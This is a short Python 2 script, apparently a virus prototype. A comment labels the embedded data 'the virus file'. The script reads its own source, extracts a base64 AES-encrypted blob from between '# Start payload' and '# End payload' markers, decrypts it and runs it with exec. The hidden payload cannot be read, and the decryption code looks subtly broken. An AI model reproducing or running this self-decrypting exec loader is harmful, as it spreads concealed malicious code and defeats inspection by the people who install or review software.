print "Hello0000000000000sfhldskjfhdjslakfhdjlksafhjldsakhfjads"

######################################################## First script python
# coding=utf-8
# Start Unencrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Unencrypted
# Start payload
#j1WY7ohl6gXKolFGoinGo4TTpgulyX+jdizy2i6v82GgSa9Zye8hhNKWpxs1FMsFzhqrO1W4k9aOElpI0JjgLvPGddARemNcOU/jtLgUsYljSn29ogFE0jBAfSHBlJggsOH0TAIyvBwtV/m3W2BK6WtPhs+2UKH8PP5ZMtfWW61nCc5FPgNDk+WcPsbI3A0hk3wukU4wP4pb9Bc8gwdc8rt/zHmAshKCx0FSMA1Dg5DugKECeiTlQkoca0JjKkb9JTpJqiYAp+E2nA73iQqnqoD32jW5Lj+NS7CfVAdjz3Bl5GNdv24wnOnM6j1wOREo1Bc5xQqierBAelcToEPjWVdSbBuhLKskO3CyIR272rYFaergS9z7tXJ4f3by0sKosYsDX0u60Jw3FQgtqfXoH+AB1HcbYkScM+EEpZqRHmm2qCjk52YWzenF28ok8nEf4cVVAgrE2G3KZ2vEw/xDm/R9oZxzssHXntIF3TYTKI0S6bEtFTvgwe9mVahlPeNPp7PdGp8Q5gCZL75Nl4Oh6kZdXKNufNu6JYwPhU8ymo66ijrzsvAhM4z22erpeNR/qE5ika6DjPL6EJoSualJ9UfulXBA7zsAvQtLXrAwuuEMnaQFi0NhF4CEkSZzZsayGtyFBuoGutW3mqHF8W07Vkj4sKC7z/mVOjHsBt6xR4qTS/7LXhXSaoWkBx38o1g26FpKkawtzPkHNsWRAOukCkoLIuUjJMK3WaDomtg+OszlVi1uqHkhq34whP28uxNTRuaJzaCQsdmd28Z81/mVksKPRKg0iMSDqHtRIwMtIskXwWYrvo3nvf8P7kPSnChCAza+82cJEdcqdym2GE1rdE/qwRj2lMxWwHVgQwkS4v6O8zFht16KJDIAAZkS3g/qwxRVbCfx4F5TNHj35iunMAW4cMvq36O6MqojIitsrTFi89QU+JyvQFBdtNRpOewgRXTbQiSJ2SGjn3O/SnAKlHbMLhjjcXbIKT6F6TooyFLr71/n10Aw3pREsM4uoNqIGAyb0FWRvuwoo5TIyQVGjPkL9TrcM9TARVYkO265EOaNHm96zVaURanvOTN52vDu044I5pzOtG7tWURpXtVt9nTi4ejbFBzzwpch766Xaw6oWQHRxfv0SAOXrSHANK7r0cWjKoJ/xb9HGmYVKVCNyGkXuluXBnbr2G8wA0h8/4qUdhFFhn9u4SuuOC+y88PNukHoDpt0rro34vVwu6s/9AG+5JTt9unYdEWQzLE0wlY2hV4+VRraIKZP1OrCXaec70uMOR/QOQ67tuld3U9WSInmXBWi+hkckpAyB4XkFZbxSgYTZx/5HnayZpBEeGFxyFHJQpPFRzeS9ReDBt6+twnDd2x6+1Nu2YTBXxsN76gT/ZDUOW8Ai3alVF1o9HT1qOolamUfGlAB9Iy05htRFa531OaKo22VBFakq7XfBCfCWXj1zAuI/FssOn8BGit83+YSQPazE3nOmIJxOaPgr1Kh+hP1hBATUlcc7IZw6z8qzUwS+mYAz+NPcizetWb8a/SZIDjPSo61WX7U+mJZVFg/Mh9TlkkYcFgACjyEOvFiZljzzhDL/g/IwWOv0HSES8Mxsmu4/DVIWcUSlhdgjtMO/Z85sxT4fSna/U1gXn1R03N6ly83FgLfBnex0LGO4b0Ui3Yd451y+p7kGfMAu2nM40+tayjmlhtY03yx3fEa1xrMiEbXjvd3p2r1oWp0WpVfi81591/wK9dLK5m6RYcAkUPMwESCf1MZia349W+BRMBBIW35gej7VbOu7gXw52RDWwduEyuFUEe+eouoYAqmS4PuL/cWQ8EFEp1bFWI6tg2G2bpg0PTr3b3JulUixt53c3jUU8q8f1IaKj5gZK5Q6YjuqYj2Vin6EIzzauhoSOnN2FYpBHT62NfjAdHXuzTMDlr3riH33w3ZENsUBPlwK0N5ppanlkj3PghIAZ+xAeAoJKEucD+/Uku8sbCwWY14pYugEzLWlHGAGe2ibdcfx1DbWA84sU7baNpFAoZXmlLaNLeyA7MHFO6sSxCUVebrYPL6JXoKigVQm4VWwCzTxqH9XH21PFl6OLbnD7DFVaC1uc2uZCoytyv8zVxxxDu+8YIFC8kpff0WNArbxGUexNXjzrhh1mlZ0izMWSMvFIA/dUARKkoBeQmJ4luP4HeMwURKaCGkMOYfgs/K4L42wxUohNnExVq6cxiGm7EAHwqPqWMsE5e5jtvMgXZFFHbkO97JU0cXHUjkSKyR+TgpuqBfFsD6TyrPcpKNerpszU60XP1XVUmL6QedBGA5xN8c2ZASEQGzlj45cj/XZJok9QmvE6TGVQ7GukjAFnsHK5Hcv5K6zdOmMIhnPdCyJ9hg1KJxhSU0bHpb5F/zRMkkH9Pz7ym7/2UEmxl/grL7kSrbaFRuEKuryTYATtQgNOFHDHhgXEvsbyivUiogLVHWtWwVDrTWpkTWKGa+ieS4pBMdk0eAou5aagEtbParyzEVuBwVhz4ovb8doAOaIv9R+9TbTXMtofGli9YGZ64enprnTGuA8xUAbDOTb7e0Qy0zxkZ8N+w93NJWAZCUsaZLvOHHHJWw5HLN/ikuh2HYUPdvy31W515GUOMFJxgL/sp/QuwK26DWSaFzEelZ3PS8xL+zV14Rux+8z+w60x2R/hBWusnDJlTD4dPMEd05lVkUL4NnMlJ29eU2ySv0ydz7mSKDg6rGnUXLhnBsyQSHiIFi0BzDH6Y0HEvTe2YCypNZN5bqW+3qAA==
# End payload